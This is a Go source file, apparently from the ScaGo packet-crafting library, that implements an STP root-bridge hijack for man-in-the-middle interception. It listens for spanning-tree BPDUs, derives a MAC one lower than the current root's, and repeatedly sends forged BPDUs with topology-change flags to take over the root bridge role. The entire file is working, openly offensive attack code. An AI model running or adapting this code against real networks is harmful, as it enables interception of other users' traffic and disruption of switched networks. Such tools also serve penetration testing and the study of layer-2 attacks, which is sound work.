package higherlevel

import (
	"fmt"
	"github.com/tiagomdiogo/ScaGo/packet"
	communication "github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
	"log"
	"strconv"
	"strings"
	"time"
)

func StpRootBridgeMitM(iface1 string) {

	for {
		pkt := communication.Recv(iface1)
		stpLayer := utils.GetSTPLayer(pkt)

		if stpLayer == nil {
			continue
		}

		rootString := stpLayer.RouteID.HwAddr.String()
		rootStringAux := strings.ReplaceAll(rootString, ":", "")
		rootInt, _ := strconv.ParseInt(rootStringAux, 16, 64)
		rootInt -= 1
		rootMacHex := fmt.Sprintf("%012x", rootInt)
		parts := make([]string, 0, 6)
		for i := 0; i < len(rootMacHex); i += 2 {
			parts = append(parts, rootMacHex[i:i+2])
		}
		rootMac := strings.Join(parts, ":")

		params := map[string]interface{}{
			"rootmac":   rootMac,
			"bridgemac": rootMac,
			"rootid":    stpLayer.RouteID.SysID,
			"bridgeid":  stpLayer.RouteID.SysID,
		}

		stpRootBridgeHijack(iface1, params)
	}
}

func stpRootBridgeHijack(iface string, params map[string]interface{}) {
	rootID := params["rootid"].(uint16)
	bridgeID := params["bridgeid"].(uint16)
	bridgeMAC := params["bridgemac"].(string)
	rootMAC := params["rootmac"].(string)

	Dot3Layer := packet.Dot3Layer()
	Dot3Layer.SetDstMAC("01:80:c2:00:00:00")
	Dot3Layer.SetSrcMAC(bridgeMAC)
	LLCLayer := packet.LLCLayer()
	stpLayer := packet.STPLayer()
	stpLayer.Layer().TC = true
	stpLayer.Layer().PortID = 0x8002
	stpLayer.SetRootBridgeMacStr(rootMAC)
	stpLayer.SetRootBridgeID(rootID)
	stpLayer.SetBridgeMacStr(bridgeMAC)
	stpLayer.SetBridgeID(bridgeID)

	pkt, _ := packet.CraftPacket(Dot3Layer.Layer(), LLCLayer.Layer(), stpLayer.Layer())
	for {
		pkt2 := communication.SendRecv(pkt, iface)
		stpResponse := utils.GetSTPLayer(pkt2)
		if stpResponse != nil {
			Dot3Layer := packet.Dot3Layer()
			Dot3Layer.SetDstMAC("01:80:c2:00:00:00")
			Dot3Layer.SetSrcMAC(bridgeMAC)

			LLCLayer := packet.LLCLayer()

			stpLayer := packet.STPLayer()
			stpLayer.Layer().TCA = true
			stpLayer.Layer().PortID = 0x8002
			stpLayer.SetRootBridgeMacStr(rootMAC)
			stpLayer.SetRootBridgeID(rootID)
			stpLayer.SetBridgeMacStr(bridgeMAC)
			stpLayer.SetBridgeID(bridgeID)

			finalAck, err := packet.CraftPacket(Dot3Layer.Layer(), LLCLayer.Layer(), stpLayer.Layer())
			if err != nil {
				log.Fatal(err)
			}
			communication.Send(finalAck, iface)
		}
		time.Sleep(5 * time.Second)
	}
}
